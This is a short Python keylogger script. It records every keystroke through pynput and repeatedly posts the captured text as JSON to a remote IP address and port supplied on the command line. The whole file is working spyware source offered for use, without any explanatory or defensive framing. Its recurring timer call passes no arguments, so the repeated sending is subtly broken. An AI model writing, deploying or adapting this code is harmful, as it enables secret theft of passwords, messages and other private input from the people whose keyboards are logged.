from pynput import keyboard
import requests
import json
import threading
import optparse

def post_request(ip, port, interval=None):
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip}:{port}", data=payload,
        headers={"Content-Type": "application/json"})
        timer = threading.Timer(interval, post_request)
        timer.start()
    except:
        print("[!] Request failed.")

def key_down(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def main():
    parser = optparse.OptionParser("Usage: program.py -i <ip address> -p <port>")
    parser.add_option('-i', dest='ip', type='string', help='Set the remote server IP')
    parser.add_option('-p', dest='port', type='string', help='Set the remote server port.')
    parser.add_option('--interval', dest='interval', type='string', help='Time interval between each thread. Default is 10 seconds.', default='10')
    (options, args) = parser.parse_args()

    ip = options.ip
    port = options.port
    interval = int(options.interval)

    if ip == None or port == None:
        print(parser.usage)
        exit(0)

    with keyboard.Listener(on_press=key_down) as listener:
        post_request(ip, port, interval=interval)
        listener.join()

if __name__ == '__main__':
    text = ""
    main()